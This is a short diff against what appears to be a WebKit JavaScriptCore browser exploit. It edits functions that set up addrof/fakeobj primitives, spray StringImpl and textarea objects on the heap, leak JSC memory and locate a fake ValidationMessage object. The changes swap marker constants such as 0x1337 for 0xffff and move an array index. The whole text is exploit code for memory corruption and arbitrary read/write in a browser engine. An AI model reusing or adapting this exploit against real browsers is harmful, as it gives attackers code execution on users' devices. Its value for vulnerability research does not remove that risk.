@@ -113,12 +113,12 @@ function setupRW() {
 	cleanup();
 
 	/* Set up addrof/fakeobj primitives */
-	g_ab_slave.leakme = 0x1337;
+	g_ab_slave.leakme = 0xffff;
 	var bf = 0;
 	for(var i = 15; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
-	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
+	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff00000000ffff")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
 
@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0xffff;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -427,7 +427,7 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
@@ -499,7 +499,7 @@ function sprayHTMLTextArea() {
 function sprayStringImpl(start, end) {
 	for (let i = start; i < end; i++) {
 		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
-		g_obj_str[s] = 0x1337;
+		g_obj_str[s] = 0xffff;
 	}
 }
 
